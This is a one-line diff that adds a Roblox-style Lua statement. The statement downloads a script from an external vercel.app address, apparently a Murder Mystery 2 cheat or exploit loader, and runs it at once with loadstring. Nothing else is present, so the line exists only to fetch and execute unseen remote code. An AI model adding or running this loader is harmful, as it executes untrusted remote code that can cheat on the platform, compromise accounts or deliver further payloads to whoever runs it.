@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://ziyadubled.vercel.app/raw/mm2"))()
